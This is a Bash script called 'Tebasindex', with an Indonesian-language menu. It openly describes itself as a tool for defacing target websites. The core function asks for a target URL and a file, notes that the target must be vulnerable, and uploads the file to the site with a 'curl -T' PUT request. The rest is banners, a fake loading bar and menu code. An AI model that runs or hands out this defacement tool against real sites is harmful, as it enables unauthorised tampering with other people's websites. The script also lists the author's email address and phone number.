#!/usr/bin/bash
# Tebasindex
# Coded by Nedi Senja
# Github: https://github.com/stepbystep/Tebasindex
checkroot(){
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mMohon, jalankan program root!\n\n\e[0m"
    exit 1
fi
}
clearscreen() {
    clear
    reset
    sleep 1
}
dependencies(){
    command -v bash > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Bash belum terinstall. Mohon install sekarang."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "Sepertinya paket cURL belum terinstall. Mohon install sekarang."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Wget belum terinstall. Mohon install sekarang."; exit 1; }
    command -v openssl > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Openssl belum terinstall. Mohon install sekarang."; exit 1; }
    command -v git > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Git belum terinstall. Mohon install sekarang."; exit 1; }
    if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
        echo "/dev/urandom tidak ditemukan!"
    exit 1
fi
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\r\e[0m[\e[1;32m%-${barlength}s\e[0m]\e[00m" "${bar:0:n}"
        printf "  \e[1;77mLOADING...!\e[0m "
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
banner(){
    echo
    printf "\e[0;33m▄▄▄▄▄▄▄▄ .▄▄▄▄·  ▄▄▄· .▄▄ ·  ▄▄▄▄▄ ▐ ▄ ·▄▄▄▄  ▄▄▄ .▐▄• ▄\n"
    printf "\e[0;33m•██  ▀▄.▀·▐█ ▀█▪▐█ ▀█ ▐█ ▀.  •██  •█▌▐███▪ ██ ▀▄.▀· █▌█▌▪\n"
    printf "\e[0;33m ▐█.▪▐▀▀▪▄▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄  ▐█.▪▐█▐▐▌▐█· ▐█▌▐▀▀▪▄ ·██·\n"
    printf "\e[0;33m ▐█▌·▐█▄▄▌██▄▪▐█▐█ ▪▐▌▐█▄▪▐█  ▐█▌·██▐█▌██. ██ ▐█▄▄▌▪▐█·█▌\n"
    printf "\e[0;33m ▀▀▀  ▀▀▀ ·▀▀▀▀  ▀  ▀  ▀▀▀▀   ▀▀▀ ▀▀ █▪▀▀▀▀▀•  ▀▀▀ •▀▀ ▀▀\n"
    echo
}
template(){
    printf "\e[0;45;77;1m[        Tebas Indexs, My Github: @stepbystepexe         ]\e[0m\n\n"
}
config(){
    read -p $'\e[0m[\e[1;93m?\e[0m\e[0m] \e[1;77mMasukan Web Target: \e[0m' link
    read -p $'\e[0m[\e[1;92m+\e[0m\e[0m] \e[1;77mMasukan Script: \e[0m' script
    sleep 1.5
    printf "\n\e[0m[\e[1;91m!\e[0m] \e[1;77mMengecek ...\n"
    sleep 3
    printf "\n\e[0m[\e[1;96m INFO \e[0m] Web target harus vulen\n"
    sleep 3
    load
    echo
    echo
    curl -T /storage/emulated/0/ $script $link
    printf "\n\e[0m[\e[1;96m#\e[0m] \033[1;77mSilahkan lihat linknya. \033[0m[ $link \033[1;77mFile \033[0m$script ]\n\e[0m"
    echo
    exit 1
    echo
}
menu(){
    printf "\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Tebasindex\n"
    echo
    printf "\033[0m[\033[93;1m&\033[0m] LISENSI\n"
    printf "\033[0m[\033[94;1m#\033[0m] Informasi\n"
    printf "\033[0m[\033[92;1m*\033[0m] Perbarui\n"
    printf "\033[0m[\033[91;1m-\033[0m] Keluar\n"
    echo
        read -p $'\e[0m[\e[1;95m/\e[0m] \e[1;77mMasukan opsi: \e[0m' option
        if [[ $option == '1' || $option == 'あ' ]]; then
            echo
            config
                elif [[ $option == '2' || $option == '&' ]]; then
                echo
                nano LICENSE
                echo
                clearscreen
                banner
                template
                menu
                    elif [[ $option == '3' || $option == '#' ]]; then
                    echo
                    informasi
                    echo
                        elif [[ $option == '4' || $option == '*' ]]; then
                        echo
                        git pull origin master
                        echo
                        read -p $'\e[0m[\e[92m Tekan Enter \e[0m]'
                        clearscreen
                        banner
                        template
                        menu
                            elif [[ $option == '5' || $option == '-' ]]; then
                            echo
                            printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mKeluar dari program!\n\e[0m"
                            echo
                            exit 1
            else
                echo
                printf "\e[0m[=\e[1;41;77m Pilihan Salah \e[0m=]"
                echo
                sleep 1
                clearscreen
                banner
                template
                menu
        fi
}
informasi(){
clear
printf "\e[0;45;77;1m[        Tebas Indexs, My Github: @stepbystepexe         ]\e[0m\n"
toilet -f smslant 'Index'
printf "
Nama        : Tebasindex
Versi       : 3.6 (Update: 17 Desember 2020, 7:30 AM)
Tanggal     : 07 Juni 2019
Author      : Nedi Senja
Tujuan      : Mendeface website target
              dengan update file
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: +62 8577-5433-901

[ \e[4mGunakan tool ini dengan bijak \e[0m]\n"
sleep 1
read -p $'\n\n\e[0m[ Tekan Enter ]' opt
    if [[ $opt = '' ]]; then
        clearscreen
        banner
        template
        menu
    fi
}
#checkroot
#dependencies
    clearscreen
    banner
    template
    menu
